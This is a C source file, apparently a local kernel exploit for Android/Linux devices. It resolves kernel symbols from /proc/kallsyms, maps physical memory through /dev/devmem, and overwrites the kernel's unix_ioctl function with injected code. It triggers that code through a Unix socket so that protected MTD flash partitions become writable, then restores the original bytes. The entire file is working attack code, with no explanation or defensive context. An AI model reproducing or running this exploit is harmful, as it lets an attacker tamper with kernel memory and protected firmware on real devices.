#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <errno.h>
#include <string.h>
#include <linux/fs.h>

#define MTD_WRITEABLE 0x400

unsigned long * __attribute__((regparm(3))) (*get_mtd_device)(void *, int);
void __attribute__((regparm(3))) (*put_mtd_device)(void *);

unsigned long get_kernel_addr(char *name)
{

        FILE *f;
        unsigned long addr;
        char dummy;
        char sname[512];
        int ret;

        f = fopen("/proc/kallsyms", "r");
        if (f == NULL)
        	return 0;

	ret = 0;
	while(ret != EOF) {
		ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, sname);
                if (!strcmp(name, sname)) {
                        fclose(f);
                        return addr;
		}
	}

	fclose(f);
	return 0;
}

int device_number;

static int __attribute__((regparm(3))) write_hack(void)
{

	unsigned long *mtd_info = get_mtd_device(NULL, device_number);
	mtd_info[1] |= MTD_WRITEABLE;
	put_mtd_device(mtd_info);
}

int main(int argc, char **argv)
{

	int fd, unix_fd, ret, zero;
	void *mem;
	char buf[256], blockdev[256];
	unsigned long unix_ioctl;

	if (argc != 2) {
		printf("[-] Usage: %s devnum\n", argv[0]);
		return 1;
	}

	device_number = atoi(argv[1]);
	
	/* Make the device writable at the block layer */
	snprintf(blockdev, sizeof(blockdev), "/dev/block/mtdblock%d",
		 device_number);

	fd = open(blockdev, O_RDWR);

	if (fd < 0) {
		printf("[-] Failed to open %s.\n", blockdev);
		return 1;
	}

	zero = 0;
	ret = ioctl(fd, BLKROSET, &zero);

	if (ret != 0) {
		printf("[-] Failed to set read-write: %s\n", strerror(errno));
		return 1;
	}

	close(fd);

	/* Make the device writable at the MTD layer */
	fd = open("/dev/devmem", O_RDWR | O_SYNC);
	if (fd < 0) {
		printf("[-] Failed to open devmem device.\n");
		return 1;
	}

	/* Resolve kernel symbols */
	get_mtd_device = (void *)get_kernel_addr("get_mtd_device");
	put_mtd_device = (void *)get_kernel_addr("put_mtd_device");
	unix_ioctl = get_kernel_addr("unix_ioctl");

	if (!get_mtd_device || !put_mtd_device || !unix_ioctl) {
		printf("[-] Failed to resolve kernel symbols.\n");
		return 1;
	}

	/* Map physical memory */
	mem = mmap(NULL, 2*4096, PROT_READ|PROT_WRITE, MAP_SHARED,
		   fd, (unix_ioctl - 0x80000000)&~0xfff);

	if (mem == MAP_FAILED) {
		printf("[-] Failed to map memory.\n");
		return 1;
	}

	memset(buf, 0, sizeof(buf));

	/* Open a Unix socket */
	unix_fd = socket(AF_UNIX, SOCK_SEQPACKET, 0);
	if (unix_fd < 0) {
		printf("[-] Failed to open Unix socket.\n");
		return 1;
	}

	/* Overwrite unix_ioctl with our hack */
	memcpy(buf, mem + (unix_ioctl & 0xfff), 256);
	memcpy(mem + (unix_ioctl & 0xfff), &write_hack, 256);

	/* Invoke our hack */
	ioctl(unix_fd);

	/* Restore unix_ioctl */
	memcpy(mem + (unix_ioctl & 0xfff), buf, 256);
	
	close(unix_fd);
	close(fd);

	return 0;

}
